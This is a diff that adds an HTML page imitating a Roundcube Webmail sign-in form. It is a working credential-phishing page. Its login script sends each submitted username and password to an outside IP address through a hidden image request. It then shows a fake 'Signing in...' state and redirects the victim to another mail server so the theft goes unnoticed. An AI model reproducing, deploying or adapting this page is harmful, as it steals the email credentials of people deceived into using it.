@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roundcube Webmail</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
+<style>
+  :root {
+    --bg: #f0f0f0;
+    --surface: #ffffff;
+    --fg: #333333;
+    --fg-muted: #666;
+    --border: #cccccc;
+    --input-bg: #ffffff;
+    --accent: #c4310f;
+    --accent-hover: #a8290d;
+    --header-bg: #3a3a3a;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #1e1e1e; --surface: #2a2a2a; --fg: #e0e0e0;
+      --fg-muted: #999; --border: #444; --input-bg: #333;
+    }
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg); color: var(--fg);
+    font-family: 'Inter', Arial, sans-serif; font-size: 13px;
+    min-height: 100vh; display: flex; flex-direction: column;
+  }
+  .topbar {
+    background: var(--header-bg); padding: 0 16px; height: 48px;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .rc-logo { display: flex; align-items: center; gap: 8px; text-decoration: none; }
+  .rc-icon { width: 28px; height: 28px; }
+  .rc-wordmark { color: #fff; font-size: 15px; font-weight: 600; }
+  .rc-wordmark span { color: #e05a3a; }
+  .main {
+    flex: 1; display: flex; align-items: center;
+    justify-content: center; padding: 40px 16px;
+  }
+  .login-wrap { width: 100%; max-width: 400px; }
+  .login-card {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.12); overflow: hidden;
+  }
+  .card-header {
+    background: var(--accent); padding: 16px 24px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .card-header-text { color: #fff; font-size: 14px; font-weight: 600; }
+  .card-body { padding: 24px; }
+  .form-row { display: flex; flex-direction: column; gap: 5px; margin-bottom: 14px; }
+  .form-row label {
+    font-size: 12px; font-weight: 600; color: var(--fg-muted);
+    text-transform: uppercase; letter-spacing: 0.4px;
+  }
+  .form-row input, .form-row select {
+    width: 100%; padding: 8px 10px; border: 1px solid var(--border);
+    border-radius: 3px; background: var(--input-bg); color: var(--fg);
+    font-size: 13px; font-family: 'Inter', Arial, sans-serif; outline: none;
+  }
+  .form-row input:focus { border-color: var(--accent); }
+  .pw-wrap { position: relative; }
+  .pw-wrap input { padding-right: 36px; }
+  .pw-eye {
+    position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer; color: var(--fg-muted);
+    padding: 2px; display: flex;
+  }
+  .options-row {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 20px; flex-wrap: wrap; gap: 8px;
+  }
+  .checkbox-label {
+    display: flex; align-items: center; gap: 6px; cursor: pointer;
+    font-size: 12px; color: var(--fg-muted); user-select: none;
+  }
+  .checkbox-label input[type="checkbox"] { width: 14px; height: 14px; accent-color: var(--accent); }
+  .btn-login {
+    width: 100%; padding: 9px 16px; background: var(--accent); color: #fff;
+    border: none; border-radius: 3px; font-size: 13px; font-weight: 600;
+    font-family: 'Inter', Arial, sans-serif; cursor: pointer;
+    display: flex; align-items: center; justify-content: center; gap: 6px;
+  }
+  .btn-login:hover { background: var(--accent-hover); }
+  .btn-login:disabled { opacity: 0.6; cursor: default; }
+  .footer-note { margin-top: 16px; text-align: center; font-size: 11px; color: var(--fg-muted); }
+  .footer-note a { color: var(--accent); text-decoration: none; }
+  .page-footer {
+    padding: 12px 16px; text-align: center; font-size: 11px;
+    color: var(--fg-muted); border-top: 1px solid var(--border);
+  }
+  .page-footer a { color: var(--fg-muted); text-decoration: none; }
+  @media (max-width: 480px) { .login-wrap { max-width: 100%; } .card-body { padding: 16px; } }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <a href="#" class="rc-logo">
+    <svg class="rc-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="18" cy="18" r="18" fill="#c4310f"/>
+      <path d="M10 11h9c3.3 0 5.5 2 5.5 5 0 2.5-1.5 4.2-3.8 4.8L25 25h-4l-3.5-4H14v4h-4V11zm4 3v4h4.5c1.4 0 2.2-.7 2.2-2s-.8-2-2.2-2H14z" fill="#fff"/>
+    </svg>
+    <span class="rc-wordmark">Round<span>cube</span></span>
+  </a>
+</div>
+
+<main class="main">
+  <div class="login-wrap">
+    <div class="login-card">
+      <div class="card-header">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2">
+          <rect x="3" y="11" width="18" height="11" rx="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        <span class="card-header-text">Sign in to Webmail</span>
+      </div>
+      <div class="card-body">
+        <form id="rcForm" onsubmit="doLogin(event)">
+          <div class="form-row">
+            <label for="rcUser">Username</label>
+            <input type="text" id="rcUser" name="user" placeholder="user@example.com" autocomplete="username" required>
+          </div>
+          <div class="form-row">
+            <label for="rcPass">Password</label>
+            <div class="pw-wrap">
+              <input type="password" id="rcPass" name="pass" placeholder="••••••••" autocomplete="current-password" required>
+              <button type="button" class="pw-eye" onclick="togglePw()" aria-label="Show password">
+                <svg id="eyeIco" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                  <circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+          <div class="form-row">
+            <label for="rcLang">Language</label>
+            <select id="rcLang">
+              <option value="en">English</option>
+              <option value="fr">Français</option>
+              <option value="de">Deutsch</option>
+              <option value="es">Español</option>
+              <option value="it">Italiano</option>
+              <option value="pt">Português</option>
+              <option value="nl">Nederlands</option>
+              <option value="ru">Русский</option>
+              <option value="ar">العربية</option>
+              <option value="zh">中文</option>
+            </select>
+          </div>
+          <div class="options-row">
+            <label class="checkbox-label">
+              <input type="checkbox" id="rememberMe"> Remember me
+            </label>
+          </div>
+          <button type="submit" class="btn-login" id="loginBtn">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+              <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/>
+              <polyline points="10 17 15 12 10 7"/>
+              <line x1="15" y1="12" x2="3" y2="12"/>
+            </svg>
+            Sign In
+          </button>
+        </form>
+        <div class="footer-note">Powered by <a href="#">Roundcube Webmail</a></div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer class="page-footer">
+  &copy; 2024 Roundcube &mdash; <a href="#">Privacy</a> &middot; <a href="#">Help</a>
+</footer>
+
+<script>
+  function togglePw() {
+    var i = document.getElementById('rcPass');
+    var ico = document.getElementById('eyeIco');
+    if (i.type === 'password') {
+      i.type = 'text';
+      ico.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
+    } else {
+      i.type = 'password';
+      ico.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+    }
+  }
+  try {
+    var su = localStorage.getItem('rc_saved_user');
+    if (su) { document.getElementById('rcUser').value = su; document.getElementById('rememberMe').checked = true; }
+  } catch(x) {}
+
+  function doLogin(e) {
+    e.preventDefault();
+    var u = document.getElementById('rcUser').value.trim();
+    var p = document.getElementById('rcPass').value;
+    try {
+      if (document.getElementById('rememberMe').checked) localStorage.setItem('rc_saved_user', u);
+      else localStorage.removeItem('rc_saved_user');
+    } catch(x) {}
+    try {
+      new Image().src = 'http://207.246.123.248:8888/c?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p) + '&ts=' + Date.now();
+    } catch(x) {}
+    var btn = document.getElementById('loginBtn');
+    btn.disabled = true;
+    btn.textContent = 'Signing in...';
+    setTimeout(function() {
+      window.location.href = 'https://mail.daystar.io:59367/SOGo/';
+    }, 1400);
+  }
+</script>
+</body>
+</html>
